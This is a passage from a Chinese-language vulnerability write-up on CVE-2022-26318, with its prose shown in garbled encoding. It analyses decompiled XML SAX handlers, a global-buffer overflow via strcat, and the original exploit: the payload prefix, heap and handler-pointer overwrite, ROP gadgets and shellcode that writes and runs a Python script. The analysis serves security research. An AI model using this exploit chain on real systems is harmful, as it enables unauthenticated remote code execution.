<span class="number">120</span>) = v9;</span><br><span class="line">                        ++*(a1 + <span class="number">108</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;name&quot;</span>) )</span><br><span class="line">                        *(a1 + <span class="number">80</span>) = <span class="number">5</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;value&quot;</span>) )</span><br><span class="line">                        *(a1 + <span class="number">80</span>) = <span class="number">7</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;value&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        *(a1 + <span class="number">80</span>) = <span class="number">7</span>;</span><br><span class="line">                        v8 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">                        <span class="keyword">if</span> ( v8 )</span><br><span class="line">                        &#123;</span><br><span class="line">                            v3 = <span class="built_in">strlen</span>(*(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">8LL</span>));</span><br><span class="line">                            *(v8 + <span class="number">1</span>) = sub_40629C(*(v8 + <span class="number">1</span>), <span class="number">0</span>, *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">8LL</span>), v3);</span><br><span class="line">                            *v8 = *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>);</span><br><span class="line">                            *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) = v8;</span><br><span class="line">                            ++*(*(a1 + <span class="number">128</span>) + <span class="number">16LL</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            fwrite(<span class="string">&quot;No memory!!!!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0xE</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">                            ++*(a1 + <span class="number">76</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;base64&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        v4 = BIO_s_mem(tag_name);</span><br><span class="line">                        v7 = BIO_new(v4);</span><br><span class="line">                        v5 = BIO_f_base64(v4);</span><br><span class="line">                        v6 = BIO_new(v5);</span><br><span class="line">                        <span class="keyword">if</span> ( v6 &amp;&amp; v7 )</span><br><span class="line">                            BIO_push(v6, v7);</span><br><span class="line">                        BIO_set_flags(v6, <span class="number">256LL</span>);</span><br><span class="line">                        *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">32LL</span>) = v7;</span><br><span class="line">                        *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">40LL</span>) = v6;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ( *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">free</span>(*(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>));</span><br><span class="line">                        *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">                        *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">24LL</span>) = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ( !strcasecmp(tag_name, <span class="string">&quot;struct&quot;</span>) )</span><br><span class="line">                        *(a1 + <span class="number">80</span>) = <span class="number">10</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(tag_name, <span class="string">&quot;methodCall&quot;</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                result = a1;</span><br><span class="line">                ++*(a1 + <span class="number">0x4C</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">            *(a1 + <span class="number">80</span>) = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *&amp;s[<span class="built_in">strlen</span>(s)] = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(s, tag_name);</span><br><span class="line">        unk_427194 = <span class="number">1</span>;</span><br><span class="line">        unk_427198 = <span class="number">0</span>;</span><br><span class="line">        result = a1;</span><br><span class="line">        ++*(a1 + <span class="number">64</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">endElementNs</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// rax</span></span><br><span class="line">    __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">void</span> **ptr; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">    <span class="type">char</span> *v6; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">    ++unk_427190;</span><br><span class="line">    v6 = <span class="built_in">strrchr</span>(s, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    --*(a1 + <span class="number">64</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">        *v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !unk_427198 )</span><br><span class="line">        unk_427198 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( *(a1 + <span class="number">80</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> ( *(a1 + <span class="number">88</span>) )</span><br><span class="line">                strcasecmp(*(a1 + <span class="number">88</span>), <span class="string">&quot;/agent/upgrade&quot;</span>);</span><br><span class="line">            LODWORD(v2) = a1;</span><br><span class="line">            *(a1 + <span class="number">80</span>) = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            LODWORD(v2) = a1;</span><br><span class="line">            *(a1 + <span class="number">80</span>) = <span class="number">6</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            *(a1 + <span class="number">80</span>) = <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">if</span> ( *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">40LL</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                BIO_free_all(*(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">40LL</span>));</span><br><span class="line">                *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">40LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">                *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">32LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">24LL</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                ++*(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">24LL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            v2 = *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v2 )</span><br><span class="line">            &#123;</span><br><span class="line">                v3 = *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>);</span><br><span class="line">                *(v3 + <span class="number">16</span>) = <span class="built_in">malloc</span>(<span class="number">1uLL</span>);</span><br><span class="line">                v2 = *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">                <span class="keyword">if</span> ( v2 )</span><br><span class="line">                &#123;</span><br><span class="line">                    v2 = *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">                    *v2 = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            LODWORD(v2) = strcasecmp(a2, <span class="string">&quot;member&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v2 )</span><br><span class="line">            &#123;</span><br><span class="line">                *(a1 + <span class="number">80</span>) = <span class="number">3</span>;</span><br><span class="line">                v2 = *(a1 + <span class="number">128</span>);</span><br><span class="line">                <span class="keyword">if</span> ( v2 )</span><br><span class="line">                &#123;</span><br><span class="line">                    v2 = *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>);</span><br><span class="line">                    <span class="keyword">if</span> ( v2 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        v2 = *(*(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) + <span class="number">8LL</span>);</span><br><span class="line">                        <span class="keyword">if</span> ( !v2 )</span><br><span class="line">                        &#123;</span><br><span class="line">                            ptr = *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>);</span><br><span class="line">                            *(*(a1 + <span class="number">128</span>) + <span class="number">24LL</span>) = *ptr;</span><br><span class="line">                            <span class="keyword">if</span> ( ptr[<span class="number">2</span>] )</span><br><span class="line">                                <span class="built_in">free</span>(ptr[<span class="number">2</span>]);</span><br><span class="line">                            <span class="built_in">free</span>(ptr);</span><br><span class="line">                            v2 = *(a1 + <span class="number">128</span>);</span><br><span class="line">                            --*(v2 + <span class="number">16</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…³é”®åœ¨äº (a1 + 80) å˜é‡(ç®€ç§°ä¸º swi)ï¼Œæ­¤å˜é‡æ§åˆ¶äº†åˆ†æ”¯ç»“æ„çš„æ‰§è¡Œé¡ºåºï¼Œæˆ‘ä»¬æŒ‰ç…§ exp ä¸­æ„é€ çš„ xml èŠ‚ç‚¹è¿›è¡Œåˆ†æã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;methodCall&gt;&lt;methodName&gt;agent.login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;value&gt;&lt;AAAAA...AAMFA&gt;&lt;BBBBMFA&gt;&lt;BBBBMFA&gt;&lt;BBBBMFA&gt;...&lt;BBBBMFA&gt;&lt;BBBBMFA&gt;payload</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆè§£æåˆ° methodCall å¼€å§‹æ ‡ç­¾ï¼Œè°ƒç”¨ startElementNs å‡½æ•°ï¼Œè§£æåå°† swi è®¾ç½®ä¸º 1</p>
<p>é‡åˆ° methodCall ç»“æŸæ ‡ç­¾ï¼Œswi &#x3D;&#x3D; 1 æ²¡æœ‰åŒ¹é…æƒ…å†µï¼Œå€¼ä¸å˜</p>
<p>é‡åˆ° methodName å¼€å§‹æ ‡ç­¾ï¼Œswi &#x3D;&#x3D; 1 åœ¨ startElementNs ä¸­å¯¹åº” case 1ï¼Œè®¾ç½® swi &#x3D; 2</p>
<p>é‡åˆ° methodName ç»“æŸæ ‡ç­¾ï¼Œswi &#x3D;&#x3D; 2 åœ¨ endElementNs ä¸­å¯¹åº” case 2ï¼Œè®¾ç½® swi &#x3D; 3</p>
<p>é‡åˆ° params å¼€å§‹æ ‡ç­¾ï¼Œswi &#x3D;&#x3D; 3 åœ¨ startElementNs å¯¹åº” case 3ï¼Œä¸è¿‡æ²¡æœ‰åŒ¹é…ä»»ä½•æƒ…å†µï¼Œswi ä¸å˜</p>
<p>é‡åˆ° param å¼€å§‹æ ‡ç­¾ï¼Œswi &#x3D;&#x3D; 3 åœ¨ startElementNs å¯¹åº” case 3ï¼Œæœ‰åŒ¹é…æƒ…å†µä½† swi ä¸å˜</p>
<p>é‡åˆ° value å¼€å§‹æ ‡ç­¾ï¼Œswi &#x3D;&#x3D; 3 åœ¨ startElementNs å¯¹åº” case 3ï¼Œæ²¡æœ‰åŒ¹é…æƒ…å†µï¼Œswi ä¸å˜</p>
<p>é‡åˆ° struct å¼€å§‹æ ‡ç­¾ï¼Œswi &#x3D;&#x3D; 3 åœ¨ startElementNs å¯¹åº” case 3ï¼Œæ²¡æœ‰åŒ¹é…æƒ…å†µï¼Œswi ä¸å˜</p>
<p>é‡åˆ° member å¼€å§‹æ ‡ç­¾ï¼Œswi &#x3D;&#x3D; 3 åœ¨ startElementNs å¯¹åº” case 3ï¼Œæœ‰åŒ¹é…æƒ…å†µï¼Œè®¾ç½® swi &#x3D; 4</p>
<p>åç»­å­˜åœ¨å¤§é‡å¡«å……çš„å¼€å§‹æ ‡ç­¾ï¼Œç”±äºæ­¤æ—¶ swi &#x3D; 4ï¼Œåœ¨ startElementNs ä¸­å¯¹åº”  case &#x3D;&#x3D; 4ï¼Œæ ‡ç­¾åä¸ç­‰äº nameï¼Œä¼šç›´æ¥ break è·³å‡º switch ç»“æ„ã€‚</p>
<p>æœ€ç»ˆä¼šæ¥åˆ°å…³é”®ç‚¹ startElementNs çš„ç¬¬ 136 è¡Œï¼Œè°ƒç”¨ strcat å‡½æ•°å°† tag_name å³æ ‡ç­¾åç›´æ¥æ‹¼æ¥åˆ°å…¨å±€å˜é‡ s ä¸­ã€‚</p>
<p>æ˜¾ç„¶æ­¤å¤„ç¼ºå°‘å¯¹ tag_name é•¿åº¦çš„æ£€æŸ¥ï¼Œå¦‚æœæ„é€ è¶…é•¿çš„ tag å¡«å……åˆ°å…¨å±€å˜é‡ä¼šå¯¼è‡´å˜é‡æº¢å‡ºã€‚</p>
<h2 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h2><p><strong>æ³¨ï¼šè°ƒè¯•è¿‡ç¨‹ä¸­ç¨‹åºå¤šæ¬¡é‡å¯ï¼Œæ‰€ä»¥æŸäº›å›¾ç‰‡ä¸­åœ°å€å¯èƒ½ä¸åŒ</strong></p>
<p>é¦–å…ˆ payload å¤´éƒ¨éœ€è¦æ„é€ åˆé€‚çš„æ ‡ç­¾åºåˆ—ï¼Œè®© startElementNs å‡½æ•°æœ€ç»ˆèƒ½å¤Ÿè¾¾åˆ° â€œç¨³å®šâ€ çŠ¶æ€ï¼Œå³å¦‚ exp ä¸­æ‰€æ„é€ çš„ï¼Œè®© swi å˜é‡å§‹ç»ˆç­‰äº 4ã€‚</p>
<p>æ‰€ä»¥ payload ç¬¬ä¸€éƒ¨åˆ†ä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &quot;&lt;methodCall&gt;&lt;methodName&gt;agent.login&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;value&gt;&quot;.encode()</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·åç»­æ ‡ç­¾åªè¦ä¸ç­‰äº nameï¼Œå°±å¯ä»¥ä¸€ç›´è§¦å‘ strcat éƒ¨åˆ†ä»£ç </p>
<p>æ¥ç€æŸ¥çœ‹ä¸€ä¸‹å…¨å±€å˜é‡ s é™„è¿‘çš„å†…å­˜å¸ƒå±€</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-3.png"
                     
                ></p>
<p>åœ¨æ‹·è´ç¬¬ä¸€ä¸ªæ ‡ç­¾æ—¶çœ‹åˆ°å˜é‡ s ä½äº 0x427360ï¼Œç”±äºç¨‹åºæ²¡æœ‰å¼€å¯ PIEï¼Œæ‰€ä»¥è¿™ä¸ªåœ°å€å›ºå®šã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-4.png"
                     
                ></p>
<p>åœ¨ s ä¸‹æ–¹åˆšå¥½è¡”æ¥äº†ç¨‹åºçš„ heap æ®µï¼Œæ‰€ä»¥ç†è®ºä¸Šæœ‰ä¸¤ç§åˆ©ç”¨æ€è·¯ï¼Œå…¶ä¸€æ˜¯é€šè¿‡æº¢å‡ºè¦†ç›–æ‰ bss æ®µä¸­å…¶ä»–å…¨å±€å˜é‡ï¼Œè¿™äº›å˜é‡å¯èƒ½åœ¨ç¨‹åºæŸå¤„è¢«ä½¿ç”¨ï¼Œå…¶äºŒåˆ™æ˜¯æ„é€ è¶³å¤Ÿé•¿çš„æ•°æ®è¦†ç›– heap ä¸­çš„æ•°æ®ï¼Œåˆ©ç”¨å †çš„æŸäº›æ“ä½œå®ç°åˆ©ç”¨ã€‚</p>
<p>å®é™…åˆ†æç¨‹åºå¯ä»¥çœ‹åˆ° s ä¸‹æ–¹å”¯ä¸€ä¸€ä¸ªå˜é‡ 0x427760 é»˜è®¤å€¼ä¸º 0ï¼Œæš‚æ—¶æ²¡çœ‹åˆ°å¯åˆ©ç”¨çš„ç‚¹ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡æ“ä½œå †å°è¯•åˆ©ç”¨ã€‚</p>
<p><strong>è°ƒè¯• EXP</strong></p>
<p>è°ƒè¯•åŸä½œè€…çš„ expï¼Œå…¶ payload é¦–å…ˆæ„é€ çš„å¾ˆå¤šç”¨äºå¡«å……çš„æ ‡ç­¾ï¼Œç¬¬ä¸€éƒ¨åˆ†ç”¨ä¸€ä¸ªæ ‡ç­¾å¡«å…… 3184 ä¸ªå­—èŠ‚ï¼Œæ‹·è´åå†…å­˜å¸ƒå±€ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-5.png"
                     
                ></p>
<p>ä»åœ°å€ 0x428000 å¼€å§‹å°±æ˜¯ heap åŒºåŸŸã€‚</p>
<p>ç¬¬äºŒéƒ¨åˆ†æ˜¯ 3680 ä¸ª &lt;BBBBMFA&gt; æ ‡ç­¾ï¼Œç›¸å½“äºå¡«å……äº† 3680 * (7 + 1) &#x3D; 29440 å­—èŠ‚ï¼Œä½†å®é™…è°ƒè¯•ä¸­è¿™äº›å­—èŠ‚ä¸ä¼šè¢«å…¨éƒ¨è¦†ç›–åˆ° heap ä¸­ï¼Œå½“è¦†ç›–åˆ°åœ°å€ 0x429e60 æ—¶ï¼Œç»§ç»­æ‰§è¡Œå°±ä¼šè°ƒèµ·æ–°çš„ç¨‹åºã€‚</p>
<p>è§‚å¯Ÿ 0x429e60 é™„è¿‘çš„å†…å­˜ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-6.png"
                     
                ></p>
<p>åœ°å€ 0x429e68 ä¸º startElementNs å‡½æ•°æŒ‡é’ˆï¼Œåœ°å€ 0x429e70 ä¸º endElementNs å‡½æ•°æŒ‡é’ˆã€‚</p>
<p>æœ€åä¸€ä¸ªæ ‡ç­¾è¦†ç›–å 0x429e68 åœ°å€ä¼šå˜ä¸º 0x41464dï¼Œç„¶ååœ¨åœ°å€ 0x7f01f16024a1 ä¼šè°ƒç”¨æ­¤æŒ‡é’ˆ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-7.png"
                     
                ></p>
<p>æˆ‘çŒœæµ‹ payload è¦†ç›–äº† libxml2 ä¸­çš„ SAX handler ç»“æ„ä½“(xmlSAXHandler ç»“æ„ï¼Ÿ)ï¼Œç¨‹åºå‡†å¤‡è§£æä¸‹ä¸€ä¸ªæ ‡ç­¾æ—¶è¦è°ƒç”¨ startElementNs å‡½æ•°æŒ‡é’ˆï¼Œä½†æ˜¯æ­¤æ—¶æŒ‡é’ˆå·²ç»è¢«ç ´åï¼Œè€Œ 0x41464d å¯¹åº”æŒ‡ä»¤ä¸º ret 0x90be</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬è¾“å…¥çš„ payload ä¹Ÿå­˜åœ¨äºæ ˆä¸Šï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-8.png"
                     
                ></p>
<p>è°ƒç”¨ 0x41464d æŒ‡é’ˆä½¿ç”¨çš„æ˜¯ call æŒ‡ä»¤ï¼Œæ‰€ä»¥ ret æŒ‡ä»¤ä¼šç›´æ¥å›åˆ° call ä¸‹ä¸€æ¡æŒ‡ä»¤ç»§ç»­æ‰§è¡Œï¼ŒåŒæ—¶ rsp ä¼šå¢å¤§(ä¸‹ç§») 0x90c6 å­—èŠ‚ï¼Œéšåè¿›å…¥å‡½æ•°è¿”å›æµç¨‹ï¼Œæœ€ç»ˆæ‰§è¡Œåˆ° ret æŒ‡ä»¤æ—¶å†…å­˜å¸ƒå±€ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-26318-9.png"
                     
                ></p>
<p>æˆ‘ä»¬å‘ç°æ­¤æ—¶å·²ç»è¿›å…¥ ROP æµç¨‹ï¼Œæ ˆä¸­çš„ payload åˆšå¥½å¯¹åº” exp ä¸­ç¬¬ä¸‰éƒ¨åˆ† payload</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\x20\x50\x40&#x27;</span> + ...</span><br></pre></td></tr></table></figure></div>

<p>ROP æ‰€ç”¨çš„ gadget åˆ—ä¸¾å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x405020          ret</span><br><span class="line">0x40f968          ret 2</span><br><span class="line">0x405020          ret</span><br><span class="line"></span><br><span class="line">0x41d60e          pop    rax</span><br><span class="line">0x41d60f          pop    rbx</span><br><span class="line">0x41d610          pop    rbp</span><br><span class="line">0x41d611          ret </span><br><span class="line"></span><br><span class="line">0x405e7d          mov    rbp, rsp                 # 1. å°† rsp æ”¾åˆ° rbp</span><br><span class="line">0x405e80          call   rax       &lt;0x41d5b1&gt;</span><br><span class="line"></span><br><span class="line">0x41d5b1          pop    rsi</span><br><span class="line">0x41d5b2          pop    r15</span><br><span class="line">0x41d5b4          ret              &lt;0x405e7c&gt;</span><br><span class="line"></span><br><span class="line">0x405e7c          push   rbp                      # 2. å°† rbp å…¥æ ˆ</span><br><span class="line">0x405e7d          mov    rbp, rsp</span><br><span class="line">0x405e80          call   rax       &lt;0x41d5b1&gt;</span><br><span class="line"></span><br><span class="line">0x41d5b1          pop    rsi</span><br><span class="line">0x41d5b2          pop    r15</span><br><span class="line">0x41d5b4          ret              &lt;0x41d2ad&gt;</span><br><span class="line"></span><br><span class="line">0x41d2ad          lea    rdx, [rbp - 0x80]       # 3. rbp - 0x80 åœ°å€æ”¾åˆ° rdx</span><br><span class="line">0x41d2b1          mov    rsi, rdx</span><br><span class="line">0x41d2b4          mov    rdi, rcx</span><br><span class="line">0x41d2b7          call   rax       &lt;0x41d5b1&gt;</span><br><span class="line"></span><br><span class="line">0x41d5b1          pop    rsi</span><br><span class="line">0x41d5b2          pop    r15</span><br><span class="line">0x41d5b4          ret              &lt;0x41d60e&gt;</span><br><span class="line"></span><br><span class="line">0x41d60e          pop    rax                     # 4. 0xc0</span><br><span class="line">0x41d60f          pop    rbx</span><br><span class="line">0x41d610          pop    rbp</span><br><span class="line">0x41d611          ret              &lt;0x40a92a&gt;</span><br><span class="line"></span><br><span class="line">0x40a92a          add    rax, rdx                # 5. rdx + 0xc0ï¼Œä¿®æ­£æ ˆåœ°å€æŒ‡å‘ shellcode</span><br><span class="line">0x40a92d          jmp    rax       &lt;0x7ffe54fa6810&gt;   # 6. è·³è½¬åˆ° shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==== shellcode ====</span><br><span class="line">0x7ffcc7d7c070    lea    rdi, [rip + 0x9d]</span><br><span class="line">0x7ffcc7d7c077    mov    esi, 0x241</span><br><span class="line">0x7ffcc7d7c07c    mov    edx, 0x1b6</span><br><span class="line">0x7ffcc7d7c081    mov    eax, 2</span><br><span class="line">0x7ffcc7d7c086    syscall  &lt;SYS_open&gt;</span><br><span class="line">        file: 0x7ffcc7d7c114 â—‚â€” &#x27;/tmp/test.py&#x27;</span><br><span class="line">        oflag: 0x241</span><br><span class="line">        vararg: 0x1b6</span><br><span class="line">0x7ffcc7d7c088    mov    qword ptr [rip + 0x92], rax</span><br><span class="line">0x7ffcc7d7c08f    mov    rdx, qword ptr [rip + 0x93]</span><br><span class="line">0x7ffcc7d7c096    lea    rsi, [rip + 0x94]</span><br><span class="line">0x7ffcc7d7c09d    mov    rdi, qword ptr [rip + 0x7d]</span><br><span class="line">0x7ffcc7d7c0a4    mov    eax, 1</span><br><span class="line">0x7ffcc7d7c0a9    syscall  &lt;SYS_write&gt;</span><br><span class="line">        fd: 0xd</span><br><span class="line">        buf: 0x7ffcc7d7c131 â—‚â€” 0x732074726f706d69 (&#x27;import s&#x27;)</span><br><span class="line">        n: 0x1ef</span><br><span class="line">0x7ffcc7d7c0ab    mov    rdi, qword ptr [rip + 0x6f]</span><br><span class="line">0x7ffcc7d7c0b2    mov    eax, 3</span><br><span class="line">0x7ffcc7d7c0b7    syscall  &lt;SYS_close&gt;</span><br><span class="line">       fd: 0xd</span><br><span class="line">0x7ffcc7d7c0b9    mov    eax, 0x3b</span><br><span class="line">0x7ffcc7d7c0be    lea    rdi, [rip + 0x3f]</span><br><span class="line">0x7ffcc7d7c0c5    mov    qword ptr [rip + 0x20], rdi</span><br><span class="line">0x7ffcc7d7c0cc    lea    rsi, [rip + 0x41]</span><br><span class="line">0x7ffcc7d7c0d3    mov    qword ptr [rip + 0x1a], rsi</span><br><span class="line">0x7ffcc7d7c0da    lea    rsi, [rip + 0xb]</span><br><span class="line">0x7ffcc7d7c0e1    xor    edx, edx</span><br><span class="line">0x7ffcc7d7c0e3    syscall  &lt;SYS_execve&gt;</span><br><span class="line">        path: 0x7ffcc7d7c104 â—‚â€” &#x27;/usr/bin/python&#x27;</span><br><span class="line">        argv: 0x7ffcc7d7c0ec â€”â–¸ 0x7ffcc7d7c104 â—‚â€” &#x27;/usr/bin/python&#x27;</span><br><span class="line">        envp: 0x0</span><br><span class="line">0x7ffcc7d7c0e5    mov    eax, 0x3c</span><br><span class="line">0x7ffcc7d7c0ea    syscall &lt;SYS_exit&gt;</span><br></pre></td></tr></table></figure></div>

<p>å¯¹ ROP åˆ†æè¯·çœ‹ä»£ç ä¸­çš„æ³¨é‡Šï¼Œç®€å•æ¥è¯´ï¼Œæ­¤ç¨‹åºçš„ stack åŒºåŸŸé»˜è®¤å…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œä½œè€…ç”¨ä¸€ç§æ¯”è¾ƒå·§å¦™çš„æ–¹æ³•å°†æ ˆçš„åœ°å€åŠ è½½åˆ°å¯„å­˜å™¨ rax ä¸­ï¼Œç„¶åè·³è½¬åˆ° rax æ‰§è¡Œ shellcodeï¼Œshellcode éƒ¨åˆ†åˆ©ç”¨ syscall å®ç°äº†å°† python code å†™å…¥ &#x2F;tmp&#x2F;test.pyï¼Œç„¶åæ‰§è¡Œ &#x2F;usr&#x2F;bin&#x2F;python &#x2F;tmp&#x2F;test.py çš„æ“ä½œï¼Œæœ€ç»ˆå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<h2 id="ç®€å•æ€»ç»“"><a href="#ç®€å•æ€»ç»“" class="headerlink" title="ç®€å•æ€»ç»“"></a>ç®€å•æ€»ç»“</h2><p>è¯¥æ¼æ´æˆå› æ˜¯ä½¿ç”¨ libxml2 SAX è§£æ xml æ—¶ï¼ŒstartElementNs handler çš„ç¼–ç æœ‰é—®é¢˜ï¼Œä»£ç ä¸­æ²¡æœ‰æ£€æŸ¥ tag_name é•¿åº¦å°±ç›´æ¥å°†å…¶æ‹¼æ¥åˆ°å…¨å±€å˜é‡ä¸­ï¼Œå¯¼è‡´å…¨å±€å˜é‡æº¢å‡ºã€‚</p>
